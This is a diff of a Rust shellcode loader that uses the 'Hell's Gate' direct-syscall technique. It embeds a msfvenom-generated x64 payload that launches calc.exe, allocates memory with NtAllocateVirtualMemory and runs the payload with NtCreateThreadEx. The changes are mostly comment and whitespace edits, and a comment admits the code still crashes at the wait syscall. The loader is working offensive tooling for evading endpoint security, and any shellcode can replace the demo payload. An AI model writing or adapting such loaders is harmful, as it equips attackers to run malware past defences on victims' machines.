@@ -9,8 +9,6 @@ use hellsgate::{gate::VxTable, hell::*};
 pub mod hellsgate;
 pub mod util;
 
-// i am particularly proud of this one
-
 // $ msfvenom -a x64 --platform windows -p windows/x64/exec cmd='cmd.exe /c calc.exe' -f rust
 const PAYLOAD: [u8; 287] = [
     0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
@@ -53,15 +51,14 @@ fn main() {
         println!("[+] {:#016x?}", table);
 
         // setup some buffers and re-usabe variables
-        let process_handle = (!0) as isize as *mut c_void; // handle to current process => 0xFFFFFFFFFFFFFFFF
+        let process_handle = (!0) as isize as *mut c_void;              // handle to current process => 0xFFFFFFFFFFFFFFFF
         let mut payload_size = PAYLOAD.len();
-        let mut lp_address = null_mut(); // mutable ptr to receive the base address of the allocation
+        let mut lp_address = null_mut();                                // mutable ptr to receive the base address of the allocation
 
         // set the syscall's SSN and pass params to assembly function so that args are set in registers and
         // on the stack as per fastcall/microsoft x64 calling conventions before the syscall is actually invoked
-        Hell::open(table.nt_allocate_virtual_memory.w_system_call); // set syscall SSN
-        status = Hell::nt_allocate_virtual_memory(
-            // setup registers and stack and invoke syscall
+        Hell::open(table.nt_allocate_virtual_memory.w_system_call);     // set syscall SSN
+        status = Hell::nt_allocate_virtual_memory(                      // setup registers and stack and invoke syscall 
             process_handle,
             &mut lp_address, // will contain the base address of the allocated region when syscall returns
             0u32,
@@ -129,9 +126,8 @@ fn main() {
         let mut h_thread: *mut c_void = null_mut();
         let entry: extern "system" fn(*mut c_void) -> u32 = { transmute(lp_address) };
 
-        Hell::open(table.nt_create_thread_ex.w_system_call); // set syscall SSN
-        status = Hell::nt_create_thread_ex(
-            // setup registers and stack and invoke syscall
+        Hell::open(table.nt_create_thread_ex.w_system_call);    // set syscall SSN
+        status = Hell::nt_create_thread_ex(                     // setup registers and stack and invoke syscall 
             transmute(&mut h_thread),
             0x1FFFFF,
             null(),
@@ -168,12 +164,13 @@ fn main() {
         println!("[+] Waiting...");
         let timeout: i64 = -100000;
 
-        Hell::open(table.nt_wait_for_single_object.w_system_call); // set syscall SSN
-        status = Hell::nt_wait_for_single_object(h_thread, 1, &timeout); // setup registers and stack and invoke syscall
+        Hell::open(table.nt_wait_for_single_object.w_system_call);          // set syscall SSN
+        status = Hell::nt_wait_for_single_object(h_thread, 1, &timeout);    // setup registers and stack and invoke syscall
+
 
         // TODO: figure out why 0xC0000005- and 0x00000102-ing
         // rust always crashes at the above syscall with `0xC0000005` or `0x00000102` ('STATUS_ACCESS_VIOLATION'/'STATUS_TIMEOUT')
-        // (even when using `windows-rs` userland calls) - these potentially indicate we're doing something wrong with pointers but
+        // (even when using `windows-rs` userland calls) - these potentially indicate we're doing something wrong with pointers but 
         //i don't know what and i'll figure it out some other time (probably)
         if status != 0x0 {
             panic!(
